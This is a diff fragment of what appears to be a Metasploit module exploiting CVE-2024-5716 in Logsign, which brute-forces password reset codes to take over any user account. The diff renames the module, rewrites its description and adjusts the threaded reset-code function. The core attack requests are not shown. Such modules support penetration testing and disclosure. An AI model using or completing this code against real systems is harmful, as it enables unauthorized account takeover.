@@ -7,11 +7,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Logsign Authentication Bypass',
+      'Name'           => 'Logsign Authentication Bypass with Brute Force',
       'Description'    => %q{
-        This module allows a malicious attacker in the Logsign application to reset the password of any user's account
-        by performing a brute force on the password reset function. The current user's account can be taken over without interaction.
-        The vulnerability is defined as CVE-2024-5716, and after this attack, access to the logsign management panel, a SIEM and hotspot product, is gained.
+        This module allows a malicious attacker to reset the password of any user's account in the Logsign application
+        by performing a brute force attack on the password reset function. This attack exploits the CVE-2024-5716 vulnerability,
+        allowing unauthorized access to the Logsign management panel, a SIEM and hotspot product.
       },
       'Author'         => ['Janke'],
       'License'        => MSF_LICENSE,
@@ -66,7 +66,10 @@ class MetasploitModule < Msf::Auxiliary
       end_code = total_count if i == (thread_number - 1)
 
       threads << Thread.new do
-        success_reset_code, target_verification_code = try_reset_code(i, start_code, end_code, protocol, remote_ip, base_uri, username, new_password)
+        success_reset_code, target_verification_code = try_reset_code(i, start_code, end_code, protocol, remote_ip, base_uri, username)
+        if success_reset_code && target_verification_code
+          print_good("Success with reset code: #{success_reset_code}, verification code: #{target_verification_code}")
+        end
       end
     end
 
@@ -114,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
     return res
   end
 
-  def try_reset_code(index, start_code, end_code, protocol, remote_ip, base_uri, username, new_password)
+  def try_reset_code(index, start_code, end_code, protocol, remote_ip, base_uri, username)
     success_reset_code = nil
     target_verification_code = nil
 
